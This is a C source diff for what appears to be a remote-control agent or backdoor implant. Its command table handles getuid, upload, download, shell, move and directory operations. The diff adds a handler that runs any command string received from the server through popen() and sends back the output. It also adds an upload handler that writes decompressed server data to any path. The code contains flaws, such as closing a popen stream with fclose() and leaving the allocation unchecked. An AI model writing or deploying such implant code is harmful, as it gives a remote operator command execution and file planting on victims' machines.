@@ -20,7 +20,7 @@ typedef int (*CMD_HANDLE)(const void * in, int len, char * out, int maxSize);
 static int process_getuid(const void * in, int len, char * out, int maxSize);
 static int process_upload(const void * in, int len, char * out, int maxSize);
 static int process_download(const void * in, int len, char * out, int maxSize);
-static int process_execute(const void * in, int len, char * out, int maxSize);
+static int process_shellcmd(const void * in, int len, char * out, int maxSize);
 static int process_move(const void * in, int len, char * out, int maxSize);
 static int process_mkdir(const void * in, int len, char * out, int maxSize);
 static int process_del_dir(const void * in, int len, char * out, int maxSize);
@@ -35,7 +35,7 @@ static CMD_HANDLE g_cmdTable[256] = {
     process_getuid, //SERVER_CMD_GETUID
     process_upload, //SERVER_CMD_UPLOAD
     process_download,//SERVER_CMD_DOWNLOAD
-    process_execute,//SERVER_CMD_EXECUTE
+    process_shellcmd,//SERVER_CMD_SHELL
     process_move,//SERVER_CMD_MOVE
     process_mkdir,//SERVER_CMD_MKDIR
     process_del_dir,//SERVER_CMD_DELDIR
@@ -58,7 +58,7 @@ int handleCmd(const struct CmdReq * cmd, char * out, int maxSize)
         rsp->flag = 0;
         rsp->sid = cmd->sid;
         int payloadLen = handle(cmd->data, datalen, rsp->data, maxSize - sizeof(*rsp));
-        if (payloadLen > 0)
+        if (payloadLen > 0 && s_errno == 0)
         {
             if (handle == process_list || handle == process_download)//对数据进行压缩
             {
@@ -102,7 +102,33 @@ static int process_getuid(const void * in, int len, char * out, int maxSize)
 
 static int process_upload(const void * in, int len, char * out, int maxSize)
 {
-    return 0;
+    const char * dstPath = (const char *)in;
+    const int pathlen = strlen(dstPath) + 1;
+    const char * zipData = dstPath + pathlen;
+    unsigned long zipDatalen = len - pathlen;
+    int result = 0;
+    unsigned long fileContentlen = 10*zipDatalen;
+    char * fileContent = (char *)malloc(fileContentlen);
+    int ret = uncompress((Bytef *)fileContent, &fileContentlen, (const Bytef *)zipData, zipDatalen);
+    if (ret == Z_OK)
+    {
+        ret = writeFile(dstPath, fileContent, fileContentlen);
+        if (ret <= 0)
+        {
+            s_errno = errno;
+            goto end;
+        }
+        s_errno = 0;
+        result = snprintf(out, maxSize, "Success");
+    }
+    else
+    {
+        s_errno = CUSTOM_ERRNO;
+        result = snprintf(out, maxSize, "Uncompress fail %d", ret);
+    }
+end:
+    free(fileContent);
+    return result;
 }
 
 static int process_download(const void * in, int len, char * out, int maxSize)
@@ -117,7 +143,7 @@ static int process_download(const void * in, int len, char * out, int maxSize)
     else if (ret == 0)
     {
         s_errno = CUSTOM_ERRNO;
-        const char errMsg[] = "File size exceed 1M.";
+        const char errMsg[] = "File size exceed 1M";
         int len = sizeof(errMsg);
         memcpy_s(out, maxSize, errMsg, len);
         return len;
@@ -125,18 +151,25 @@ static int process_download(const void * in, int len, char * out, int maxSize)
     s_errno = 0;
     return ret;
 }
-static int process_execute(const void * in, int len, char * out, int maxSize)
+static int process_shellcmd(const void * in, int len, char * out, int maxSize)
 {
-    const char * exePath = (const char * )in;
-    if (fork() == 0)
+    FILE * fp = popen((const char *)in, "r");
+    if (fp)
     {
-        if (fork() == 0)
+        int id = 0;
+        do
         {
-            
-        }
+            out[id++] = fgetc(fp);
+        } while (!feof(fp) && id < maxSize);
+        fclose(fp);
+        s_errno = 0;
+        return id;
     }
     
-    return 0;
+    s_errno = CUSTOM_ERRNO;
+    #define FAILURE_LEN 8
+    memcpy_s(out, maxSize, "Failure", FAILURE_LEN);
+    return FAILURE_LEN;
 }
 static int process_move(const void * in, int len, char * out, int maxSize)
 {
